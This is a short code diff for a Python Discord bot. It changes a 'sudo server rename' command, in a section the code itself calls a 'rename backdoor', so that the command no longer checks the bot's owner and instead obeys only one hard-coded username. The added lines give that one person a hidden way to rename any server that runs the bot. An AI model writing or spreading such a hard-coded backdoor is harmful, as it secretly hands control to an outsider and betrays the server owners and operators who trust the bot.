@@ -101,7 +101,8 @@ async def sudo_roleassign(ctx):
 # ================= rename backdoor =================
 @sudo.command(name="server")
 async def sudo_server(ctx, action: str = None, *, name: str = None):
-    if not is_owner(ctx):
+    # ONLY allow this exact username
+    if ctx.author.name != "nico044037":
         return
 
     if action != "rename" or not name:
@@ -113,7 +114,6 @@ async def sudo_server(ctx, action: str = None, *, name: str = None):
         await ctx.send(f"✅ server renamed to **{name}**")
     except discord.Forbidden:
         await ctx.send("❌ missing permissions")
-
 # ================= STOP MESSAGE =================
 @sudo.command(name="stopmessage")
 async def sudo_stopmessage(ctx):
@@ -142,6 +142,7 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
 
 
